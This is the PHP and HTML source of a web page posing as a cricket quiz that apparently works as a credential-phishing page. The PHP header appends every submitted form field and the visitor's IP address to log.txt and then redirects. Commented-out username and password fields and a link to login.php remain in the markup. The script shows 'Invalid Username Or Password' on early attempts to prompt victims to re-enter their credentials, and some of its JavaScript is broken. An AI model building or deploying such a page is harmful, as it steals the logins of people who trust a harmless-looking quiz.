<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: index2.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿
<!DOCTYPE html>
<html>
<head>
<title>Cricket World Cup Quiz 2019</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#fdcccc">
<meta name="msapplication-navbutton-color" content="#fdcccc">
<meta name="apple-mobile-web-app-status-bar-style" content="#2196f3">
<meta name="description" content="How much your friends know about you ? Create a Quiz about you and share it with your friends. Check how many they can get correctly" />
<meta name="keywords" content="myfeelings, friends, friendship quiz, friendship test" />
<meta property="og:type" content="website" />
<meta property="og:image" content="http://myfeelings.pw/images/ogimage.jpg" />
<link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="/icons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/icons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
<link rel="manifest" href="/icons/manifest.json">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<meta name="robots" content="noindex, nofollow">
<style>
html,body,h1,h2,h3,h4,h5,h6,span {font-family: "Montserrat", sans-serif;}
html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0;background-color:#ff1e50}
.topbar{
	position: fixed;
    width: 100%;
    z-index: 1;
    background-color: #33337a !important;
	overflow: hidden;
	border-bottom:2px solid #f55757;
	border-bottom-left-radius:5px;
	border-bottom-right-radius:5px;
}
.space{
	height:120px;
}
.one{
	font-size:21px;
	display: block;
	font-weight:bold;
}
.default-one{
	font: normal 16px/normal Montserrat, Tahoma, sans-serif;
	display:inline;
}
.box{
	padding-top:10px;
	background:#fff;
	padding-bottom:20px;
	margin-left:20px;
	margin-right:20px;
	box-shadow: 0 4px 10px 0 rgba(0,0,0,0.2), 0 4px 20px 0 rgba(0,0,0,0.19);
	border: 2px solid #fdcccc;
    -webkit-border-radius: 31px;
    border-radius: 20px;
}
.content{
	margin:20px;
	border-radius: 20px;
}
.title{
	font-size:21px;
}
.sub_title{
	font-size:18px;
}
.ad{
	-webkit-align-content: center;
    align-content: center;
	margin-top:20px;
}
.smallu{
    color: aliceblue;
    margin: 10px;
	font-size:13px;
	text-decoration:bold;
    text-align: center;
}
h4{
	font-size:14px;
}
.enter_text {
  padding: 14px 24px;
  border: 2px solid #f55757;
  -webkit-border-radius: 28px;
  border-radius: 28px;
  font: normal 16px/normal Montserrat, Tahoma, sans-serif;
  color: rgba(0,0,0,1);
  text-align: center;


  -o-text-overflow: clip;
  text-overflow: clip;
  background: #f2dada;
  -webkit-box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
  box-shadow: 2px 2px 2px 0 rgba(0,0,0,0.2) inset;
}
.small-box{
	margin-top:20px;
	max-width: 100%;
	max-height: 70%;
	margin-bottom:20px;
}
.main_button {
  display: inline-block;
  cursor: pointer;
  margin-top: 10px;
  padding: 10px 27px;
  border: 2px solid #fdcccc;
  -webkit-border-radius: 31px;
  border-radius: 31px;
  font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
  color: rgba(255,255,255,0.9);
  text-align: center;
  -o-text-overflow: clip;
  text-overflow: clip;
  background: #f55757;
}
.ans_list{
	margin-top:5px;
	margin-bottom:5px;
	border-top: 1px solid #ddd;
}
.show_ans{
	background:none!important;
     color:inherit;
     border:none; 
	 font-family: "Montserrat", sans-serif;
	 font-size:14px;
	 text-decoration:bold;
	 text-align:left;
	 cursor: pointer;
	 display:block;
	 width:100%;
	 padding:10px;
	border-bottom: 1px solid #ddd;
}
select{
	border-radius:20px;
	border:2px solid  #f55757;
	padding:10px;
	margin-left:5px;
}
.whatsapp,.facebook,.msgner {
  display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  cursor: pointer;
  margin: 10px;
  text-decoration:none;
  padding: 10px 30px 10px 30px;
  border: none;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
  color: rgba(255,255,255,0.9);
  -o-text-overflow: clip;
  text-overflow: clip;
  background: #128C7E;
}
.copytext{
	display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  cursor: pointer;
  margin: 10px;
  text-decoration:none;
  padding: 10px;
  border: none;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
  color: white;
  -o-text-overflow: clip;
  text-overflow: clip;
  background: black;
}
.facebook{
	background:#3b5998;
}
.msgner{
	background:#2196F3;
}
.hide{
	display:none;
}
.textareacopy{
	color:#2196F3;
	border: none;
	text-align:center;			
	width: 90%;
  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
}
.yellow-strip{
	margin:10px;
	padding:15px;
	  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
	color: #000!important;
    background-color: #ffffcc!important;
}
.parm-table{
	border: 1px solid #ccc;
	border-collapse: collapse;
    border-spacing: 0;
    width: 100%;
    display: table;
}
.parm-table td:first-child {
    padding-left: 16px;
}
.parm-table td{
    padding: 8px 8px;
    display: table-cell;
    text-align: left;
    vertical-align: top;
}
.parm-table tr:nth-child(even) {
    background-color: #f1f1f1;
}
.parm-table tr:nth-child(odd) {
    background-color: #fff;
}
.parm-table tr{
	border-bottom: 1px solid #ddd;
}
.parm-table td:first-child {
    padding-left: 16px;
}
.parm-table td{
    padding: 8px 8px;
    display: table-cell;
    text-align: left;
    vertical-align: top;
}
.table_heading{
	    border-bottom: 1px solid #ddd;
		color: #fff !important;
        background-color: #f55757 !important;
}
.bottom{
    color: aliceblue;
	text-align:center;
	  font: normal 16px/normal Montserrat,Tahoma, Geneva, sans-serif;
	  margin-top:30px;	

}</style>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-118893437-2" type="ec9aee17e5a0a244e2552532-"></script>
<script type="ec9aee17e5a0a244e2552532-">
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118893437-2');
</script>
</head><body>
    
 
    
    
<div class="topbar"><center><a href="/"><img src="logo2.png" width="210px" height="80px" ></a></center></div>
<div class="space"></div>
    
<div class="box">
<center>
<h1 class="title">How Much You Know<br> about Cricket?</h1>
<div class="small_box">

<!--
<input class="enter_text" id="email" type="text" name="name" placeholder="Enter Your Username" autocomplete="on" required><br/>
<input class="enter_text" id="pass" type="password" name="password" placeholder="Enter Your Password" autocomplete="on" required><br/>

 
<input type="hidden" name="user_name" value="VishvjeetYadav" />
<input type="hidden" name="ques" value="1" />
<input type="hidden" name="id" value="27448" />
<input type="hidden" name="alpha" value="p" />
<input type="hidden" name="ans_data" value="" />
<input type="hidden" name="user_profile" value="NCwwLDQsMSw1LDEsMiwzLDQs" />
<input type="hidden" name="user_cry" value="MS02LTIwMDI=" /> -->
<a href="login.php" >
    <input type="submit" class="main_button" id="btnClick" value="Start Quiz" onclick="CountFun()";/></a>
<!-- <Button class="main_button" id="attempt" type="button" value="Playnow">Playnow</Button> -->
<!-- <input class="main_button" type="submit" value="Play" style="display: none;" /> -->

</div>
</center>
</div><div class="content">
<div class="yellow-strip">There are no answers from friends yet.!</div>
</div>
<br><br>
<div class="smallu">If you have any problem regarding our service, then you can contact us at <b><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="31584150435c00080807715e44455d5e5e5a1f525e5c">[email&#160;protected]</a></b>.</div>
<div class="bottom"><center>(c) Emirates Web Apps 2019</center></div>
<script data-cfasync="false" src="/cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script src="https://ajax.cloudflare.com/cdn-cgi/scripts/4f936b58/cloudflare-static/rocket-loader.min.js" data-cf-nonce="ec9aee17e5a0a244e2552532-" defer=""></script>

<!-- 
<script>
	//code for checking 4 attempts
    var count=0;
    
      	$("#attempt").click(function(){
               count+=1;
            if(count>=4)
            $('#4attempt').click;  
            alert(count); 
      	});
      
</script> -->
<script>
    var cnt=0;
    var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;

    function CountFun(){
     cnt=parseInt(cnt)+parseInt(1);
       var email=getElementById['email'].val();
       var pass=getElementById['pass'].val();


              //var address = document.getElementById[email].value;
            if (reg.test(email) == false) 
                alert(email+' Invalid Email Address');
            else if(email=="")
            	alert("Email Field Must Be Filled");
            else if(pass=="")
            	alert("Password Field Must Be Filled");
             else if(cnt<4)
                alert("Invalid Username Or Password");
     /*      
     var divData=document.getElementById("showCount");
     divData.innerHTML="Number of Downloads: ("+cnt +")";*///this part has been edited

    }
  </script>




</body>
</html>
